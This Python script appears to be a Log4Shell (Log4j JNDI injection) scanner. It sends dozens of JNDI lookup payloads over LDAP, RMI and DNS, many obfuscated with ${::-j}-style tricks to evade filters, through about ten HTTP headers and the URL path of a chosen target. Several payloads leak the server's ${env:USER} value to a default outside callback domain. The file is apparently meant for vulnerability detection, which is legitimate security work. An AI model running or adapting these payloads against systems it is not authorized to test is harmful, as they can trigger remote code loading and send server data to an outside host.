#!/usr/bin/env python3

# With inspirations from Northwave and KPN, combined with my own styling

import argparse
import requests
import uuid
import logging
import urllib3
import time
import sys
import os
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

header_injects = [
#    'X-Api-Version',
    'User-Agent',
    'Referer',
    'X-Druid-Comment',
    'Origin',
    'Location',
    'X-Forwarded-For',
    'Cookie',
    'X-Requested-With',
    'X-Forwarded-Host',
    'Accept'
]

prefixes_injects = [
    'jndi:rmi',
    'jndi:ldap',
    'jndi:dns',
    'jndi:${lower:l}${lower:d}ap'
]

def argparsing(exec_file):
    parser = argparse.ArgumentParser(exec_file)
    parser.add_argument("--reply-fqdn",
                        dest='replyfqdn',
                        help="Reply FQDN",
                        default='log4jdnsreq.cyberz.nl',
                        type=str)
    parser.add_argument("--target",
                        dest='target',
                        help="Target host to examine",
                        default=None,
                        type=str)
    parser.add_argument("--timeout",
                        dest='timeout',
                        help="Timeout",
                        default=15,
                        type=int)
    parser.add_argument("--https-only",
                        dest='httpsonly',
                        help="Force HTTPS only",
                        default=False,
                        action='store_true')

    return parser



def send_request(url, headers={}, timeout=5):
    try:
        requests.get(
            url,
            headers=headers,
            verify=False,
            timeout=timeout
        )
    except requests.exceptions.ConnectionError as e:
        logging.error(f"HTTP connection to target URL error: {e}")
    except requests.exceptions.Timeout:
        logging.error("HTTP request timeout")
    except (requests.exceptions.InvalidURL, urllib3.exceptions.LocationParseError) as e:
        logging.error(f"Failed to parse URL: {e}")

def generate_header_value(payl):
    headers = {}

    for header in header_injects:
        headers[header] = payl

    return headers


# Check 1 (User Agent)
def check1(schema, url_input, reply_host, payl, timeout):
    logging.info(f"check1: Sending request to {schema}{url_input.hostname} using injecting {payl}")

    gh = generate_header_value(payl)
    for key, value in gh.items():
        headers = {}
        headers['X-Api-Version'] = "42"
        headers[key] = value
        send_request(f"{schema}{url_input.netloc}", headers, timeout)


# Check 2 (Get request)
def check2(schema, url_input, reply_host, payl, timeout):
    logging.info(f"check2: Sending request to {schema}{url_input.hostname} injecting {payl}")

    send_request(f"{schema}{url_input.netloc}/{payl}", {}, timeout)


def deliver(args, url_input, reply_host, payl, timeout):
    schema = ['http://', 'https://']

    for s in schema:
        if args.httpsonly and s != 'https://':
            continue

        check1(s, url_input, reply_host, payl, timeout)
        check2(s, url_input, reply_host, payl, timeout)


def payload_generator(identifier, url_input, reply_host):
    payloads = []

    obs_jndi = []
    obs_jndi.append('jndi')
    obs_jndi.append('${::-j}ndi')
    obs_jndi.append('${::-j}${::-n}di')
    obs_jndi.append('${::-j}${::-n}${::-d}i')
    obs_jndi.append('${::-j}${::-n}${::-d}${::-i}')
    obs_jndi.append('j${::-n}di')
    obs_jndi.append('j${::-n}${::-d}i')
    obs_jndi.append('jnd${::-i}')



    payloads.append(f'${{jndi:ldap://${{env:USER}}.{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{jndi:dns://${{env:USER}}.{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')

    payloads.append(f'${{jndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{jndi:dns://{identifier}.{url_input.hostname}.{reply_host}:53/test.class}}')
    payloads.append(f'${{jndi:rmi://{identifier}.{url_input.hostname}.{reply_host}:1099/test.class}}')

    payloads.append(f'${{${{::-j}}ndi:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}di:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:rmi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}mi://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}i://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')

    payloads.append(f'${{${{::-j}}ndi:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}di:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:dns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}ns://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}${{::-n}}s://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-d}}${{::-n}}${{::-s}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')


    payloads.append(f'${{${{::-j}}ndi:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}di:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}i:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}dap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}ap://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}p://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')
    payloads.append(f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{identifier}.{url_input.hostname}.{reply_host}/test.class}}')

    return payloads

#${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
#${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
#${jndi:rmi://adsasd.asdasd.asdasd}
#${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
#${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}



def payload_generation(args, url_input, reply_host, timeout):
    identifier = uuid.uuid4()
    logging.debug(f"Generated UUID: {identifier}")

    payloads = payload_generator(identifier, url_input, reply_host)


    for payl in payloads:
        deliver(args, url_input, reply_host, payl, timeout)


def main():
    # Arguments parsing
    argparser = argparsing(os.path.basename(__file__))
    args = argparser.parse_args()

    # No target, no dice
    if not args.target:
        argparser.print_help()
        sys.exit(1)

    # Parse URL
    url_input = urlparse(args.target)
    if url_input.hostname is None or not url_input.hostname:
        url_input = urlparse('dummy://' + args.target)

    # Generate payload and run it
    payload_generation(args, url_input, args.replyfqdn, args.timeout)


if __name__ == "__main__":
    main()
